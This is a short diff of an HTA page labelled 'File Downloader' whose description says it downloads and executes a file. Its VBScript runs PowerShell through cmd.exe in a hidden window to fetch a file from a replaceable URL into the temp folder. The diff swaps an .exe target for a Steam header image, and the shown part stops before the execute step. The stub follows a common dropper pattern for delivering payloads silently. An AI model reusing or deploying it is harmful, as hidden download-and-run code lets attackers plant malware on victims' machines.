@@ -4,7 +4,7 @@
   </head>
   <body>
     <h2>File Downloader</h2>
-    <p>This HTA downloads and executes a file.</p>
+    <p>This HTA downloads and executes a file a.</p>
   </body>
 
   <script language="VBScript">
@@ -14,7 +14,7 @@
       Set objShell = CreateObject("WScript.Shell")
       tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
       downloadUrl = "https://shared.steamstatic.com/store_item_assets/steam/apps/1721470/header.jpg" ' Replace with your download URL
-      downloadedFile = tempFolder & "\downloaded-file.exe"
+      downloadedFile = tempFolder & "\header.jpg"
       cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
       objShell.Run "cmd.exe /c " & cmdCommand, 0, True
       If FileExists(downloadedFile) Then
